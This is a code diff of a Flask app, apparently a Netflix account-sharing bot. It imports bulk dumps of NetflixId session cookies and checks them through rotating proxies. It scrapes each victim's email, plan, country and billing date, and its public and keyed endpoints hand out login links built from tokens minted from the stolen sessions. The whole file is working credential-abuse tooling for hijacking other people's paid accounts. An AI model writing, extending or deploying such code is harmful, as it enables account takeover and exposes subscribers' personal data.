@@ -1,6 +1,7 @@
-# nftbot_all.py — Flask app for Railway (real account info via GraphQL)
+# nftbot_all.py — Flask app for Railway
 import os, json, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
 from contextlib import contextmanager
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 from urllib3.exceptions import InsecureRequestWarning
 from flask import Flask, request, jsonify, send_from_directory
@@ -19,9 +20,9 @@ MAX_FAILS   = 5
 os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 
 checker_state = {"running": False, "total": 0, "checked": 0, "kept": 0, "deleted": 0, "logs": []}
-import_state  = {"running": False, "total": 0, "checked": 0, "added": 0, "dead": 0,
-                 "dupes": 0, "invalid": 0, "logs": []}
+import_state  = {"running": False, "total": 0, "checked": 0, "added": 0, "dead": 0, "dupes": 0, "invalid": 0, "logs": []}
 
+# ---------- Netflix API ----------
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
     "appVersion": "15.48.1",
@@ -88,8 +89,7 @@ CREATE TABLE IF NOT EXISTS nonces (
     nonce TEXT PRIMARY KEY, ip TEXT, created_at REAL
 );
 CREATE TABLE IF NOT EXISTS task_state (
-    name TEXT PRIMARY KEY,
-    running INTEGER NOT NULL DEFAULT 0,
+    name TEXT PRIMARY KEY, running INTEGER NOT NULL DEFAULT 0,
     payload TEXT NOT NULL DEFAULT '{}'
 );
 """
@@ -129,6 +129,14 @@ def _load_state(name, state):
 def _reset_state(name, state, default):
     state.clear(); state.update(default); _save_state(name, state)
 
+# ---------- helpers ----------
+def _clean(s):
+    if not isinstance(s, str): return s
+    s = s.replace("\\x40", "@").replace("\x40", "@")
+    s = s.replace("\\x20", " ").replace("\x20", " ")
+    s = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)
+    return s
+
 def hash_key(raw): return hashlib.sha256(raw.encode()).hexdigest()
 
 def create_api_key(label=None):
@@ -157,118 +165,8 @@ def list_api_keys():
 def revoke_api_key(kid):
     with _lock, db() as c: c.execute("UPDATE api_keys SET revoked=1 WHERE id=?", (kid,))
 
-def _decode(v):
-    if isinstance(v, str) and "%" in v:
-        try: return urllib.parse.unquote(v)
-        except Exception: return v
-    return v
-
-def extract_cookie_dict(text):
-    out = {}
-    for raw in text.splitlines():
-        line = raw.strip()
-        if not line or line.startswith("#"): continue
-        parts = line.split("\t")
-        if len(parts) >= 7: out[parts[5]] = parts[6]
-    try: data = json.loads(text)
-    except json.JSONDecodeError: data = None
-    if isinstance(data, list):
-        for ck in data:
-            if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
-                out[ck["name"]] = _decode(ck["value"])
-    elif isinstance(data, dict):
-        if any(k in data for k in COOKIE_KEYS):
-            for k in COOKIE_KEYS:
-                if isinstance(data.get(k), str): out[k] = _decode(data[k])
-        elif isinstance(data.get("cookies"), list):
-            for ck in data["cookies"]:
-                if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
-                    out[ck["name"]] = _decode(ck["value"])
-    for k in COOKIE_KEYS:
-        if k in out: continue
-        m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
-        if m: out[k] = _decode(m.group(1))
-    m = re.search(r"profileId=([a-zA-Z0-9_-]+)", text)
-    if m: out["profileId"] = m.group(1)
-    return out
-
-def fetch_token(netflix_id, proxy=None):
-    h = dict(BASE_HEADERS); h["Cookie"] = f"NetflixId={netflix_id}"
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    r = requests.get(API_URL, params=QUERY_PARAMS, headers=h, timeout=20, verify=False, proxies=proxies)
-    r.raise_for_status()
-    td = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
-    token = td.get("token"); expires = td.get("expires")
-    if not token: raise ValueError("no token in response")
-    if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
-    return token, expires
-
-def fetch_account_info(netflix_id, token, proxy=None):
-    """Query Netflix GraphQL to pull real plan / country / email / renewal date."""
-    headers = dict(BASE_HEADERS)
-    headers["Cookie"] = f"NetflixId={netflix_id}"
-    headers["Authorization"] = f"Bearer {token}"
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-
-    params = dict(QUERY_PARAMS)
-    params["path"] = '["account","membershipStatus","currentPlan","growthAccount","currentProfile"]'
-
-    try:
-        r = requests.get(API_URL, params=params, headers=headers, timeout=20,
-                         verify=False, proxies=proxies)
-        if r.status_code != 200: return {}
-        data = r.json()
-    except Exception:
-        return {}
-
-    def deep(d, keys):
-        if isinstance(d, dict):
-            for k, v in d.items():
-                if k in keys and v: return v
-                r2 = deep(v, keys)
-                if r2: return r2
-        elif isinstance(d, list):
-            for item in d:
-                r2 = deep(item, keys)
-                if r2: return r2
-        return None
-
-    plan = deep(data, ["planName", "localizedPlanName"])
-    status = deep(data, ["membershipStatus", "holdStatus"])
-    country = deep(data, ["countryOfSignUp", "countryOfSignup", "currentCountry"])
-    if isinstance(country, dict): country = country.get("code")
-    email_obj = deep(data, ["emailAddress"])
-    email = email_obj.get("value") if isinstance(email_obj, dict) else email_obj
-    next_billing = deep(data, ["localDate", "nextBillingDate"])
-
-    return {
-        "plan": (plan or "").lower() if plan else None,
-        "country": (country or "").upper() if country else None,
-        "email": email,
-        "next_billing": next_billing,
-        "membership_status": status,
-    }
-
-def add_cookie(raw_text, source=None, meta_override=None):
-    ck = extract_cookie_dict(raw_text); nid = ck.get("NetflixId")
-    if not nid: raise ValueError("no NetflixId in cookie")
-    pid = ck.get("profileId")
-    meta = meta_override if meta_override is not None else {}
-    meta_json = json.dumps(meta) if meta else None
-    now = time.time()
-    with _lock, db() as c:
-        row = c.execute("SELECT id,deleted FROM cookies WHERE netflix_id=?", (nid,)).fetchone()
-        if row:
-            if row["deleted"]:
-                c.execute("UPDATE cookies SET deleted=0,fail_count=0,raw=?,profile_id=?,meta_json=? WHERE id=?",
-                          (raw_text, pid, meta_json, row["id"]))
-                return row["id"], nid
-            raise ValueError("cookie already in pool")
-        cur = c.execute("INSERT INTO cookies(raw,netflix_id,profile_id,meta_json,created_at) VALUES(?,?,?,?,?)",
-                        (raw_text, nid, pid, meta_json, now))
-        return cur.lastrowid, nid
-
-def _split_cookie_chunks(text):
+# ---------- cookie parsing ----------
+def _split(text):
     text = (text or "").strip()
     if not text: return []
     nid_count = len(re.findall(r"(?<!\w)NetflixId=", text))
@@ -291,6 +189,147 @@ def _split_cookie_chunks(text):
     if buf: chunks.append("\n".join(buf).strip())
     return [c for c in chunks if c]
 
+def _parse_one(text):
+    out = {}
+    for raw in text.splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#"): continue
+        parts = line.split("\t")
+        if len(parts) >= 7: out[parts[5]] = parts[6]
+    try: data = json.loads(text)
+    except json.JSONDecodeError: data = None
+    if isinstance(data, list):
+        for ck in data:
+            if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
+                out[ck["name"]] = ck["value"]
+    elif isinstance(data, dict):
+        if any(k in data for k in COOKIE_KEYS):
+            for k in COOKIE_KEYS:
+                if isinstance(data.get(k), str): out[k] = data[k]
+        elif isinstance(data.get("cookies"), list):
+            for ck in data["cookies"]:
+                if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
+                    out[ck["name"]] = ck["value"]
+    for k in COOKIE_KEYS:
+        if k in out: continue
+        m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
+        if m: out[k] = m.group(1)
+    return out
+
+def extract_cookies(text):
+    out = []
+    for ch in _split(text):
+        d = _parse_one(ch)
+        nid = d.get("NetflixId")
+        if nid: out.append((nid, ch, d))
+    return out
+
+# ---------- Netflix calls ----------
+def fetch_token(netflix_id, proxy=None):
+    h = dict(BASE_HEADERS); h["Cookie"] = f"NetflixId={netflix_id}"
+    p = {"http": proxy, "https": proxy} if proxy else None
+    r = requests.get(API_URL, params=QUERY_PARAMS, headers=h, timeout=20, verify=False, proxies=p)
+    r.raise_for_status()
+    td = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+    tok = td.get("token")
+    if not tok: raise ValueError("no token in response")
+    return tok
+
+def fetch_account_info(netflix_id, token, proxy=None):
+    p = {"http": proxy, "https": proxy} if proxy else None
+    headers = dict(BASE_HEADERS)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
+    headers["Authorization"] = f"Bearer {token}"
+    headers["x-netflix.request.routing"] = '{"path":"/nq/mobile/nqios/~15.48.0/account","control_tag":"iosui_argo"}'
+    params = dict(QUERY_PARAMS)
+    params["path"] = '["account","membershipStatus","currentPlan"]'
+
+    try:
+        r = requests.get(API_URL, params=params, headers=headers, timeout=15, verify=False, proxies=p)
+        if r.status_code == 200:
+            data = r.json()
+            def deep(d, keys):
+                if isinstance(d, dict):
+                    for k, v in d.items():
+                        if k in keys and v: return v
+                        r2 = deep(v, keys)
+                        if r2: return r2
+                elif isinstance(d, list):
+                    for item in d:
+                        r2 = deep(item, keys)
+                        if r2: return r2
+                return None
+            plan = deep(data, ["planName", "localizedPlanName"])
+            status = deep(data, ["membershipStatus"])
+            country = deep(data, ["countryOfSignUp", "currentCountry"])
+            if isinstance(country, dict): country = country.get("code")
+            email_obj = deep(data, ["emailAddress"])
+            email = email_obj.get("value") if isinstance(email_obj, dict) else email_obj
+            nb = deep(data, ["localDate", "nextBillingDate"])
+            if plan or email:
+                return {"plan": (plan or "").lower().replace("_", " ") or None,
+                        "country": (country or "").upper() if country else None,
+                        "email": _clean(email), "next_billing": _clean(nb),
+                        "membership_status": status}
+    except Exception:
+        pass
+
+    web_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Encoding": "identity",
+    }
+    sess = requests.Session()
+    sess.headers.update(web_headers)
+    sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com")
+    try:
+        r = sess.get("https://www.netflix.com/account/membership", timeout=20, proxies=p, verify=False)
+        if r.status_code == 200 and "login" not in r.url.lower():
+            t = r.text
+            plan = None
+            m = re.search(r'"planName"\s*:\s*"([^"]+)"', t)
+            if m: plan = m.group(1).lower()
+            if not plan:
+                m = re.search(r'"localizedPlanName"[^}]*?"value"\s*:\s*"([^"]+)"', t)
+                if m: plan = m.group(1).lower()
+            email = None
+            m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', t)
+            if m: email = m.group(1)
+            country = None
+            m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', t)
+            if m: country = m.group(1).upper()
+            nb = None
+            m = re.search(r'"nextBillingDate"[^}]*?"localDate"\s*:\s*"([^"]+)"', t)
+            if m: nb = m.group(1)
+            status = None
+            m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', t)
+            if m: status = m.group(1)
+            return {"plan": plan, "country": country, "email": _clean(email),
+                    "next_billing": _clean(nb), "membership_status": status}
+    except Exception:
+        pass
+
+    return {}
+
+def add_cookie(raw_text, meta=None):
+    ck = _parse_one(raw_text); nid = ck.get("NetflixId")
+    if not nid: raise ValueError("no NetflixId in cookie")
+    meta_json = json.dumps(meta) if meta else None
+    now = time.time()
+    with _lock, db() as c:
+        row = c.execute("SELECT id,deleted FROM cookies WHERE netflix_id=?", (nid,)).fetchone()
+        if row:
+            if row["deleted"]:
+                c.execute("UPDATE cookies SET deleted=0,fail_count=0,raw=?,meta_json=? WHERE id=?",
+                          (raw_text, meta_json, row["id"]))
+                return row["id"], nid
+            raise ValueError("cookie already in pool")
+        cur = c.execute("INSERT INTO cookies(raw,netflix_id,meta_json,created_at) VALUES(?,?,?,?)",
+                        (raw_text, nid, meta_json, now))
+        return cur.lastrowid, nid
+
+# ---------- pool ops ----------
 def pool_stats():
     with db() as c:
         total = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0").fetchone()[0]
@@ -302,7 +341,7 @@ def pool_stats():
     return {"total": total, "healthy": healthy, "dying": dying, "dead": dead, "issued": issued, "keys": keys}
 
 def _pick_random(plan=None, country=None):
-    q = "SELECT id,netflix_id,profile_id,meta_json FROM cookies WHERE deleted=0 AND fail_count<?"
+    q = "SELECT id,netflix_id,meta_json FROM cookies WHERE deleted=0 AND fail_count<?"
     args = [MAX_FAILS]
     if plan:
         q += " AND json_extract(meta_json, '$.plan') = ?"; args.append(plan.lower())
@@ -323,17 +362,16 @@ def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
             continue
         tried.add(cid); attempts += 1
         try:
-            token, expires = fetch_token(row["netflix_id"])
+            token = fetch_token(row["netflix_id"])
             url = f"https://www.netflix.com/login?nftoken={token}"
-            if row["profile_id"]: url += f"&profileIds={row['profile_id']}"
             meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
             with _lock, db() as c:
                 c.execute("UPDATE cookies SET ok_count=ok_count+1,fail_count=0,last_used=? WHERE id=?",
                           (time.time(), cid))
-                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,expires,created_at) "
-                                "VALUES(?,?,?,?,?,?)", (cid, api_key_id, token, url, expires, time.time()))
-                return {"url": url, "expires": expires, "cookie_id": cid,
-                        "attempts": attempts, "token_id": cur.lastrowid, "meta": meta}
+                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,created_at) "
+                                "VALUES(?,?,?,?,?)", (cid, api_key_id, token, url, time.time()))
+                return {"url": url, "cookie_id": cid, "attempts": attempts,
+                        "token_id": cur.lastrowid, "meta": meta}
         except Exception as e:
             last_err = str(e)
             with _lock, db() as c:
@@ -342,12 +380,12 @@ def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
                 c.execute("UPDATE cookies SET deleted=1 WHERE id=? AND fail_count>=?", (cid, MAX_FAILS))
     raise RuntimeError(f"Gave up after {attempts} attempts: {last_err}")
 
-def list_cookies(offset=0, limit=200, include_dead=False):
-    q = "SELECT id,netflix_id,profile_id,meta_json,fail_count,ok_count,last_error,last_used,created_at,deleted FROM cookies"
+def list_cookies(limit=500, include_dead=False):
+    q = "SELECT id,netflix_id,meta_json,fail_count,ok_count,last_error,last_used,created_at,deleted FROM cookies"
     if not include_dead: q += " WHERE deleted=0"
-    q += " ORDER BY id DESC LIMIT ? OFFSET ?"
+    q += " ORDER BY id DESC LIMIT ?"
     with db() as c:
-        rows = [dict(r) for r in c.execute(q, (limit, offset)).fetchall()]
+        rows = [dict(r) for r in c.execute(q, (limit,)).fetchall()]
     for r in rows:
         try: r["meta"] = json.loads(r["meta_json"]) if r["meta_json"] else {}
         except Exception: r["meta"] = {}
@@ -359,6 +397,7 @@ def hard_delete(cid):
 def bulk_delete_all():
     with _lock, db() as c: c.execute("DELETE FROM cookies")
 
+# ---------- proxy parsing ----------
 def parse_proxy_line(line):
     line = line.strip()
     if not line or line.startswith("#"): return None
@@ -395,16 +434,13 @@ def _parse_proxies(proxies_input):
         if p: out.append(p)
     return raw, out
 
+# ---------- background checker ----------
 def run_checker(proxies_input):
-    from concurrent.futures import ThreadPoolExecutor, as_completed
     raw, proxies = _parse_proxies(proxies_input)
-
     _reset_state("checker", checker_state,
                  {"running": True, "total": 0, "checked": 0, "kept": 0, "deleted": 0, "logs": []})
     checker_state["running"] = True
     checker_state["logs"].append(f"[PROXY] {len(raw)} lines received, {len(proxies)} parsed OK")
-    for i, p in enumerate(proxies[:3], 1):
-        checker_state["logs"].append(f"[PROXY] #{i}: {re.sub(r'://.*?@', '://***:***@', p)}")
 
     with db() as c:
         rows = c.execute("SELECT id,netflix_id,meta_json FROM cookies WHERE deleted=0").fetchall()
@@ -416,29 +452,43 @@ def run_checker(proxies_input):
     worker_count = max(2, min((len(proxies) or 4), 8))
 
     def worker(row):
-        if not checker_state["running"]: return ("skip", row["id"], None)
+        if not checker_state["running"]: return ("skip", row["id"], None, None)
         proxy = random.choice(proxies) if proxies else None
         try:
-            fetch_token(row["netflix_id"], proxy=proxy)
-            return ("ok", row["id"], row["meta_json"])
+            token = fetch_token(row["netflix_id"], proxy=proxy)
         except Exception as e:
-            return ("fail", row["id"], str(e))
+            return ("fail", row["id"], str(e), None)
+        info = fetch_account_info(row["netflix_id"], token, proxy=proxy)
+        return ("ok", row["id"], info, proxy)
 
     with ThreadPoolExecutor(max_workers=worker_count) as pool:
         futures = [pool.submit(worker, r) for r in rows]
         for idx, fut in enumerate(as_completed(futures), 1):
-            status, cid, data = fut.result()
+            status, cid, data, proxy = fut.result()
             if status == "skip": continue
             if status == "ok":
-                meta = json.loads(data) if data else {}
-                plan = (meta.get("plan") or "").lower()
-                if plan in ("premium", "standard", "standard_with_ads"):
-                    checker_state["kept"] += 1
-                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan})")
-                else:
+                info = data or {}
+                plan = (info.get("plan") or "").lower()
+                status_val = (info.get("membership_status") or "").upper()
+                if status_val in ("ON_HOLD", "PAST_DUE", "SUSPENDED"):
                     checker_state["deleted"] += 1
-                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (plan={plan or 'unknown'})")
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (on hold)")
                     with _lock, db() as c: c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+                elif plan in ("premium", "standard", "standard with ads", "standard with adverts", "standard_with_ads"):
+                    with _lock, db() as c:
+                        c.execute("UPDATE cookies SET meta_json=?, fail_count=0 WHERE id=?",
+                                  (json.dumps({
+                                      "plan": info.get("plan"),
+                                      "country": info.get("country"),
+                                      "email": info.get("email"),
+                                      "next_billing": info.get("next_billing"),
+                                  }), cid))
+                    checker_state["kept"] += 1
+                    checker_state["logs"].append(f"[{idx}/{total}] {info.get('email') or '?'} KEPT ({plan or '?'} · {info.get('country') or '?'})")
+                else:
+                    with _lock, db() as c: c.execute("UPDATE cookies SET fail_count=0 WHERE id=?", (cid,))
+                    checker_state["kept"] += 1
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT (plan unknown)")
             else:
                 err = (data or "").lower()
                 if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
@@ -454,58 +504,60 @@ def run_checker(proxies_input):
     checker_state["logs"].append("[DONE]")
     _save_state("checker", checker_state)
 
+# ---------- background importer ----------
 def run_importer(texts, proxies_input):
-    from concurrent.futures import ThreadPoolExecutor, as_completed
     raw, proxies = _parse_proxies(proxies_input)
-
     all_chunks = []
-    for t in texts: all_chunks.extend(_split_cookie_chunks(t))
+    for t in texts:
+        all_chunks.extend([c for c, _, _ in extract_cookies(t)] and [(nid, ch) for nid, ch, _ in extract_cookies(t)])
+
+    # flatten to (netflix_id, raw_chunk)
+    flat = []
+    for t in texts:
+        for nid, ch, _ in extract_cookies(t):
+            flat.append((nid, ch))
 
     _reset_state("importer", import_state,
                  {"running": True, "total": 0, "checked": 0, "added": 0, "dead": 0,
                   "dupes": 0, "invalid": 0, "logs": []})
     import_state["running"] = True
-    import_state["total"] = len(all_chunks)
+    import_state["total"] = len(flat)
     import_state["logs"].append(f"[PROXY] {len(raw)} lines received, {len(proxies)} parsed OK")
-    import_state["logs"].append(f"[START] Verifying {len(all_chunks)} cookies before import...")
+    import_state["logs"].append(f"[START] Verifying {len(flat)} cookies before import...")
     _save_state("importer", import_state)
 
     worker_count = max(2, min((len(proxies) or 4), 8))
 
-    def worker(chunk):
-        if not import_state["running"]: return ("skip", None, None)
-        ck = extract_cookie_dict(chunk); nid = ck.get("NetflixId")
-        if not nid: return ("invalid", None, None)
+    def worker(item):
+        if not import_state["running"]: return ("skip", None, None, None)
+        nid, chunk = item
         proxy = random.choice(proxies) if proxies else None
         try:
-            token, _ = fetch_token(nid, proxy=proxy)
+            token = fetch_token(nid, proxy=proxy)
         except Exception as e:
             err = str(e).lower()
             if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
-                return ("proxyerr", None, None)
-            return ("dead", None, None)
+                return ("proxyerr", None, None, None)
+            return ("dead", None, None, None)
         info = fetch_account_info(nid, token, proxy=proxy)
         status = (info.get("membership_status") or "").upper()
         if status in ("ON_HOLD", "PAST_DUE", "SUSPENDED"):
-            return ("dead", None, None)
-        return ("live", chunk, info)
+            return ("dead", None, None, None)
+        return ("live", chunk, info, nid)
 
     with ThreadPoolExecutor(max_workers=worker_count) as pool:
-        futures = [pool.submit(worker, ch) for ch in all_chunks]
+        futures = [pool.submit(worker, item) for item in flat]
         for idx, fut in enumerate(as_completed(futures), 1):
-            status, chunk, info = fut.result()
+            status, chunk, info, nid = fut.result()
             if status == "skip": continue
-            if status == "invalid":
-                import_state["invalid"] += 1
-                import_state["logs"].append(f"[{idx}/{len(all_chunks)}] INVALID (no NetflixId)")
+            if status == "proxyerr":
+                import_state["logs"].append(f"[{idx}/{len(flat)}] PROXY ERROR")
             elif status == "dead":
                 import_state["dead"] += 1
-                import_state["logs"].append(f"[{idx}/{len(all_chunks)}] DEAD skipped")
-            elif status == "proxyerr":
-                import_state["logs"].append(f"[{idx}/{len(all_chunks)}] PROXY ERROR")
+                import_state["logs"].append(f"[{idx}/{len(flat)}] DEAD skipped")
             elif status == "live":
                 try:
-                    add_cookie(chunk, meta_override={
+                    add_cookie(chunk, meta={
                         "plan": info.get("plan"),
                         "country": info.get("country"),
                         "email": info.get("email"),
@@ -513,22 +565,23 @@ def run_importer(texts, proxies_input):
                     })
                     import_state["added"] += 1
                     import_state["logs"].append(
-                        f"[{idx}/{len(all_chunks)}] ADDED ({info.get('plan') or '?'} · {info.get('country') or '?'} · {info.get('email') or '?'})")
+                        f"[{idx}/{len(flat)}] ADDED ({info.get('plan') or '?'} · {info.get('country') or '?'} · {info.get('email') or '?'})")
                 except ValueError as e:
                     if "already" in str(e):
                         import_state["dupes"] += 1
-                        import_state["logs"].append(f"[{idx}/{len(all_chunks)}] DUPE")
+                        import_state["logs"].append(f"[{idx}/{len(flat)}] DUPE")
                     else:
                         import_state["invalid"] += 1
-                        import_state["logs"].append(f"[{idx}/{len(all_chunks)}] INVALID")
+                        import_state["logs"].append(f"[{idx}/{len(flat)}] INVALID")
             import_state["checked"] = idx
-            if idx % 3 == 0 or idx == len(all_chunks):
+            if idx % 3 == 0 or idx == len(flat):
                 _save_state("importer", import_state)
 
     import_state["running"] = False
     import_state["logs"].append(f"[DONE] added={import_state['added']} dead={import_state['dead']} dupes={import_state['dupes']} invalid={import_state['invalid']}")
     _save_state("importer", import_state)
 
+# ---------- Flask app ----------
 app = Flask(__name__)
 CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key", "X-Admin-Pass"])
 app.secret_key = PANEL_SECRET
@@ -558,8 +611,8 @@ def public_challenge():
 @app.route("/api/public-generate", methods=["POST"])
 def public_generate():
     data = request.get_json(silent=True) or {}
-    nonce = data.get("nonce"); plan = data.get("plan", "").strip().lower()
-    country = data.get("country", "").strip().upper()
+    nonce = data.get("nonce"); plan = (data.get("plan") or "").strip().lower()
+    country = (data.get("country") or "").strip().upper()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if not nonce: return jsonify({"ok": False, "error": "Missing challenge"}), 403
     cleanup_nonces()
@@ -570,8 +623,8 @@ def public_generate():
     try:
         r = generate_link(plan=plan, country=country)
         r["meta"]["credit"] = "STYFAIR dev styfair (@styfair)"
-        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
-                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
+        return jsonify({"ok": True, "url": r["url"], "cookie_id": r["cookie_id"],
+                        "attempts": r["attempts"], "account": r["meta"]})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 502
 
@@ -585,8 +638,8 @@ def api_generate():
     try:
         r = generate_link(api_key_id=ident["id"])
         r["meta"]["credit"] = "STFAIR dev styfair (@styfair)"
-        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
-                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
+        return jsonify({"ok": True, "url": r["url"], "cookie_id": r["cookie_id"],
+                        "attempts": r["attempts"], "account": r["meta"]})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 502
 
@@ -620,7 +673,7 @@ def admin_revoke_key():
 @app.route("/api/admin/cookies", methods=["GET"])
 def admin_cookies():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
-    return jsonify(list_cookies(limit=500, include_dead=True))
+    return jsonify(list_cookies(include_dead=True))
 
 @app.route("/api/admin/cookies/delete", methods=["POST"])
 def admin_delete_cookie():
@@ -648,8 +701,7 @@ def admin_bulk():
     if not texts: return jsonify({"ok": False, "error": "no files"}), 400
     if import_state["running"]:
         return jsonify({"ok": False, "error": "Importer already running"}), 400
-    threading.Thread(target=run_importer, args=(texts, proxy_input),
-                     daemon=True, name="importer-worker").start()
+    threading.Thread(target=run_importer, args=(texts, proxy_input), daemon=True, name="importer-worker").start()
     return jsonify({"ok": True, "mode": "background"})
 
 @app.route("/api/admin/importer/status", methods=["GET"])
@@ -657,8 +709,7 @@ def admin_importer_status():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
     _load_state("importer", import_state)
     if import_state["running"] and not _thread_alive("importer-worker"):
-        import_state["running"] = False
-        _save_state("importer", import_state)
+        import_state["running"] = False; _save_state("importer", import_state)
     return jsonify(import_state)
 
 @app.route("/api/admin/checker/start", methods=["POST"])
@@ -675,8 +726,7 @@ def admin_checker_status():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
     _load_state("checker", checker_state)
     if checker_state["running"] and not _thread_alive("checker-worker"):
-        checker_state["running"] = False
-        _save_state("checker", checker_state)
+        checker_state["running"] = False; _save_state("checker", checker_state)
     return jsonify(checker_state)
 
 if __name__ == "__main__":
